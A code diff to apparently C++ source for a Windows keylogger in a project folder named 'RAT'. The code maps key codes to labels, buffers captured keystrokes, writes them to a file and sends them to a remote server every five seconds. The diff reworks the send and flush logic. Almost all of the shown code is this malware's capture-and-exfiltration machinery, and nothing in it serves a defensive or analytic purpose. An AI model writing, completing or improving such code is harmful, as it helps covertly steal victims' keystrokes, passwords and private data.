@@ -10,7 +10,7 @@
 #include <vector>
 #include <sstream>
 #include <winuser.h>
-#include <C:\Users\thelab\development\RAT\network.h>
+#include <C:\Users\thelab\development\RAT\network.h> //Need to include your path-> How to fix this?  
 #include <locale>
 #include <codecvt>
 #include <windows.h>
@@ -39,12 +39,12 @@ std::unordered_map<DWORD, std::wstring> VirtualKeyMap = {
     {VK_DELETE, L"[DELETE]"}, 
 };
 
-bool SendVectorToServer() {
+bool SendVectorToServer(std::vector<std::pair<std::string, std::wstring>> sendingVector) {
     
     std::string keystrokeData;
     std::lock_guard<std::mutex> guard(bufferMutex);
 
-    for (const auto& entry : keystrokeVector) {
+    for (const auto& entry : sendingVector) {
         keystrokeData.append(entry.first)
         .append(",")
         .append(converter.to_bytes(entry.second))
@@ -72,26 +72,40 @@ void WriteVectorToFile() {
         outFile << entry.first.c_str() << L"," << entry.second << L"\n";
     }
 
-    //keystrokeVector.clear();
+    keystrokeVector.clear();
     outFile.close();
 }
 
 void PeriodicVectorFlush() {
     while (true) {
         std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
-        WriteVectorToFile();
-
         if (!client.connectToServer()) {
             std::cerr << "Failed to connect to server! \n";
-            continue; // try again next sleep periode 
-        }
+          
+        } else {
 
-        if (!SendVectorToServer()) {
+            if (!SendVectorToServer(keystrokeVector)) {
             std::cerr << "Failed to send data to server! \n";
+            }
         }
         
-        
-        keystrokeVector.clear();
+        WriteVectorToFile();
+
+        // bool connected = false;
+
+        // if (client.connectToServer()) {
+        //     connected = true;
+
+        //     if (!SendVectorToServer()) {
+        //         std::cerr << "Failed to send data to server! \n";
+        //     }
+        // }
+            
+        // else {
+        //     std::cerr << "Failed to connect to server! \n";
+        // }
+
+
     }
 }
 
